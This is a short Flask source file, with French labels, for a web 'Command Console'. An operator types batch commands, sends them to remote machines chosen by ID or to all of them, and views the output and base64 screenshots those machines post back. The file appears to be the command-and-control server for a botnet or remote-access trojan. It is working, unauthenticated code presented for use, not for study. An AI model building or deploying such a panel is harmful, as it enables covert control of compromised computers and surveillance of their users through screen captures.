# app.py

from flask import Flask, request, render_template_string

app = Flask(__name__)

commande = ""
resultat_commande = ""
destinataires = ""
screenshot_data = ""

html_formulaire = """
<!DOCTYPE html>
<html>
<head><title>Command Console</title></head>
<body>
    <h2>Entrer une commande Batch</h2>
    <form action="/" method="POST">
        <input type="text" name="commande" placeholder="Commande batch">
        <br>
        <label for="destinataires">Destinataires (séparés par des virgules, '*' pour tous, '!id' pour exclure):</label>
        <input type="text" name="destinataires" placeholder="* ou ID1,ID2,...">
        <button type="submit">Envoyer</button>
    </form>
    <form action="/clear_output" method="POST" style="margin-top: 20px;">
        <button type="submit">Clear Outputs</button>
    </form>
    <p>Dernière commande soumise : {{ commande }}</p>
    <p>Destinataires : {{ destinataires }}</p>

    <h3>Résultat de la commande :</h3>
    <pre>{{ resultat_commande }}</pre>

    {% if screenshot_data %}
    <h3>Capture d'écran :</h3>
    <img src="data:image/png;base64,{{ screenshot_data }}"
         alt="Screenshot" style="max-width:100%;border:1px solid #ccc;"/>
    {% endif %}
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def index():
    global commande, destinataires, screenshot_data
    if request.method == "POST":
        commande = request.form.get("commande", "").strip()
        destinataires = request.form.get("destinataires", "").strip()
    return render_template_string(
        html_formulaire,
        commande=commande,
        destinataires=destinataires,
        resultat_commande=resultat_commande,
        screenshot_data=screenshot_data
    )

@app.route("/post_resultat", methods=["POST"])
def post_resultat():
    global resultat_commande, screenshot_data
    machine_id = request.form.get("id", "").strip()
    resultat = request.form.get("resultat", "").strip()
    # Si c'est une capture d'écran encodée
    if resultat.startswith("SCREENSHOT:"):
        screenshot_data = resultat.split("SCREENSHOT:", 1)[1]
        return "Screenshot reçu", 200

    resultat_commande += f"\n[{machine_id}]\n{resultat}\n"
    return "Résultat reçu", 200

@app.route("/clear_output", methods=["POST"])
def clear_output():
    global resultat_commande, screenshot_data
    resultat_commande = ""
    screenshot_data = ""
    return "Outputs cleared", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
